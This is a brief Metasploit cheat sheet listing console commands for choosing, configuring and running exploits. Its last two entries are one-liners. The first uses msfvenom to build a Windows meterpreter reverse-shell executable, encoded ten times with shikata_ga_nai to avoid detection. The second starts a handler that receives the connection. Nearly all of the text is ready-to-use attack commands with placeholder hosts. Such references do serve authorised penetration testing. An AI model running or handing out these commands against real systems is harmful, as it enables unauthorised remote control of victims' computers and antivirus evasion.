# Metasploit

## Show all exploits that for a vulnerability

```shell
grep <vulnerability> show exploits
```

## Select an exploit to use

```shell
use <exploit>
```

## See the current settings for a selected exploit

```shell
show options
```

## See compatible payloads for a selected exploit

```shell
show payloads
```

## Set the payload for a selected exploit

```shell
set payload <payload>
```

## Set setting for a selected exploit 

```shell
set <option> <value>
```

## Run the exploit

```shell
exploit
```

## One liner to create/generate a payload for windows

```shell
msfvenom --arch x86 --platform windows --payload windows/meterpreter/reverse_tcp LHOST=<listening_host> LPORT=<listening_port> --bad-chars “\x00” --encoder x86/shikata_ga_nai --iterations 10 --format exe --out /path/
```

## One liner start meterpreter

```shell
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <listening_host>;set LPORT <listening_port>;run;"
```
